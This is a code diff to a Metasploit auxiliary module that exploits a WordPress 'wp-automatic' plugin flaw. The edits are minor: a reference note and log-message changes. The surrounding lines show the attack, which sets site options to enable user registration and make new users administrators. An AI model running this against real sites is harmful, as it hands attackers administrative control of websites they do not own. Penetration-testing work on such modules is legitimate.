@@ -31,7 +31,8 @@ class MetasploitModule < Msf::Auxiliary
         'Targets' => [['WordPress', {}]],
         'DefaultTarget' => 0,
         'References' => [
-          ['URL', 'https://blog.nintechnet.com/critical-vulnerability-fixed-in-wordpress-automatic-plugin/']
+          ['URL', 'https://blog.nintechnet.com/critical-vulnerability-fixed-in-wordpress-automatic-plugin/'],
+          ['NOCVE', 'Patched in 3.53.3 without vendor disclosure']
         ],
         'Notes' => {
           'Stability' => [CRASH_SAFE],
@@ -56,7 +57,7 @@ class MetasploitModule < Msf::Auxiliary
     # this is for pickup into the vulnerable plugins list
     # check_plugin_version_from_readme('wp-automatic', '3.53.3')
 
-    if set_wp_option(Rex::Text.rand_text_numeric(8..20), Rex::Text.rand_text_numeric(8..20)) == true
+    if set_wp_option(Rex::Text.rand_text_numeric(8..20), Rex::Text.rand_text_numeric(8..20))
       checkcode = Exploit::CheckCode::Vulnerable
     else
       checkcode = Exploit::CheckCode::Safe
@@ -90,13 +91,13 @@ class MetasploitModule < Msf::Auxiliary
       end
     end
 
-    print_warning('Enabling user registrations...')
+    print_status('Enabling user registrations...')
     unless set_wp_option('users_can_register', '1')
       print_error('Failed to enable user registrations')
       return
     end
 
-    print_warning('Setting the default user role type to administrator...')
+    print_status('Setting the default user role type to administrator...')
     unless set_wp_option('default_role', 'administrator')
       print_error('Failed to set the default user role')
       return
